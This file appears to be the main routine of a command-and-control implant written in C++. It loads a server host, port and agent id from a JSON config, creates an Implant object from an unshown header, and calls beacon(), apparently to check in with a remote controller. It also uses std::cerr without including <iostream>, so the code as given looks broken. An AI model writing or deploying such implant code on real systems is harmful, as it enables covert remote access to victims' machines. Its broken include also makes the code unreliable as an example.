#include <stdio.h>
#include <fstream>
#include <nlohmann/json.hpp>
#include <string>

#include "implant.h"

using json = nlohmann::json;

int main() {
    std::ifstream configFile("config.json");

    if (!configFile) {
        std::cerr << "Could not open config file." << std::endl;
        return 1;
    }

    json config;
    try {
        configFile >> config;
    } catch (const json::parse_error& e) {
        std::cerr << "Could not parse file. Error: " << e.what() << std::endl;
        return 1;
    }

    std::string server_host = config["host"];
    std::string server_port = config["port"];
    std::string agent_id = config.value("id", "");

    // Validate that host and port are not empty before constructing the Implant object
    if (!server_host.empty() && !server_port.empty()) {
        Implant implant{server_host, server_port, agent_id, true};
        implant.beacon();
    } else {
        std::cerr << "Error: Host and/or port are empty!" << std::endl;
    }

    return 0;
}
